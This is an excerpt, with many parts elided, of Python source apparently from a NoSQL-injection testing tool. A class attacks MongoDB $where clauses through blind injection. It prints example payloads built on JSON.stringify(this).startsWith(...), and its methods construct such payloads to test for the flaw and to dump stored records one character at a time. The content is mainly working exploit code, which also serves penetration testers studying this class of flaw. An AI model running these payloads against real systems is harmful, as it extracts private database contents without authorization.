...
class WhereBlindJSONStringifyInjection:
    def doc(self):
        bold("--Description--");
        print("Attempts to exploit a one liner where check in a mongodb injection point to gather \
data via blind injection. Uses JSONStringify to get json objects in the form of strings.");
        ...
        print("' || JSON.stringify(this).startsWith('\"') && '' == '");
        print("' || JSON.stringify(this).startsWith('\"u') && '' == '");
        print("' || JSON.stringify(this).startsWith('\"us') && '' == '");
        print("' || JSON.stringify(this).startsWith('\"use') && '' == '");
        print("' || JSON.stringify(this).startsWith('\"user') && '' == '");
        print("' || JSON.stringify(this).startsWith('\"usern') && '' == '");
...
set maxthreads as high as you want.");
    ...
    def vulnTest(self):
        ...
        for options in self.getAllOptions():
            ...
            data = copy.deepcopy(self.scanner.data);
            data[self.param] = self.buildPayload(options," || JSON.stringify(this).startsWith('{') && '' == ");
    ...
    def dumpEntry(self,var=[],retry=0):
        ...
        if entry != "":
            ...
            failure("Failed to fetch an entry. Maybe it was a false positive or internet delay?");
    ...
    def dumpEntryChar(self,var,c):
        try:
            ...
            payload = self.buildPayload(self.options," || JSON.stringify(this)" + self.slice + ".startsWith('" + condition + "') && '' == ");
